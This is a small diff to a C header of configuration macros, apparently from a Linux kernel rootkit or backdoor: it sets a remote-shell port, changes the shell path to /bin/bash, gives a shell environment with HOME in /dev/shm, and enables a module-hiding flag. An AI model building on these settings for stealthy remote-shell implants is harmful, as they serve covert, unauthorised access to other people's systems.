@@ -49,7 +49,7 @@
 #define HTM_RSH_PORT 46692
 #define HTM_RSH_PORT_STRING "46692"
 
-#define HTM_EXEC_SHELL "/usr/bin/bash"
+#define HTM_EXEC_SHELL "/bin/bash"
 #define HTM_EXEC_ENVP { "HOME=/dev/shm", "PATH=/usr/bin:/bin:/usr/sbin:/sbin", "TERM=xterm-256color", NULL }
 
 #define HTM_INIT_HIDE_MODULE
